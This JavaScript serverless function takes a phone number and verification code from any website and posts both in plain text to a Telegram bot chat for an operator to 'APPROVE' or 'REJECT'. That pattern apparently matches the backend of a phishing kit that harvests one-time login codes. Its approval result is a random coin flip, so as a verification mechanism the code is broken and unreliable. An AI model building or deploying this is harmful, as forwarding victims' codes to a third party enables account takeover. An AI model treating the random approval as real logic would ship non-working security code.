// Vercel serverless function for code verification via Telegram bot
export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { phoneNumber, verificationCode } = req.body;

    if (!phoneNumber || !verificationCode) {
      return res.status(400).json({ error: 'Phone number and verification code are required' });
    }

    // Replace with your actual Telegram bot token and chat ID
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('Missing Telegram credentials');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const message = `Code verification:\n📱 Phone: ${phoneNumber}\n🔐 Code: ${verificationCode}\n\n⚠️ Please reply with "APPROVE" or "REJECT"`;

    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!telegramResponse.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    // For demo purposes, return a random approval/rejection
    // In production, you'd implement a proper verification mechanism
    // This could involve polling your bot's messages or using webhooks
    const approved = Math.random() > 0.5; // Replace with actual logic

    res.status(200).json({ approved });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}